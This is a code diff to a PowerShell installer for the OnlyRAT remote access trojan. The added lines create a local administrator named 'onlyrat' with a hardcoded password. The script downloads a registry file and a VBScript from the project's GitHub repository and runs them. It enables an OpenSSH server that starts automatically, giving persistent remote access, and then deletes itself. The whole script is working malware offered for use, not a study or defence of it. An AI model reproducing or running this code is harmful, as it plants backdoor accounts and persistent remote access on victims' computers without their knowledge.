@@ -7,23 +7,26 @@ function random_text {
 }
 
 # creates local admin
-function create_account {
+function Create-NewLocalAdmin {
     [CmdletBinding()]
     param (
-        [string] $uname,
-        [securestring] $pword
+        [string] $NewLocalAdmin,
+        [securestring] $Password
     )    
     begin {
     }    
     process {
-        New-LocalUser "$uname" -pword $pword -FullName "$uname" -Description "Temporary local admin"
-        Write-Verbose "$uname local user crated"
-        Add-LocalGroupMember -Group "Administrators" -Member "$uname"
+        New-LocalUser "$NewLocalAdmin" -Password $Password -FullName "$NewLocalAdmin" -Description "Temporary local admin"
+        Write-Verbose "$NewLocalAdmin local user crated"
+        Add-LocalGroupMember -Group "Administrators" -Member "$NewLocalAdmin"
         Write-Verbose "$NewLocalAdmin added to the local administrator group"
     }    
     end {
     }
 }
+$NewLocalAdmin = "onlyrat"
+$Password = (ConvertTo-SecureString "12192003" -AsPlainText -Force)
+Create-NewLocalAdmin -NewLocalAdmin $NewLocalAdmin -Password $Password
 
 # varaibles
 $wd = random_text
@@ -47,14 +50,15 @@ Invoke-WebRequest -Uri raw.githubusercontent.com/CosmodiumCS/OnlyRAT/main/files/
 $vbs_file = random_text
 Invoke-WebRequest -Uri raw.githubusercontent.com/CosmodiumCS/OnlyRAT/main/files/confirm.vbs -OutFile "$vbs_file.vbs"
 
-# install the registry
-./"$reg_file.reg";"$vbs_file.vbs"
-
 # enabling persistent ssh
 Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
 Start-Service sshd
 Set-Service -Name sshd -StartupType 'Automatic'
 Get-NetFirewallRule -Name *ssh*
+
+
+# install the registry
+./"$reg_file.reg";"$vbs_file.vbs"
 
 # self delete
 cd $initial_dir
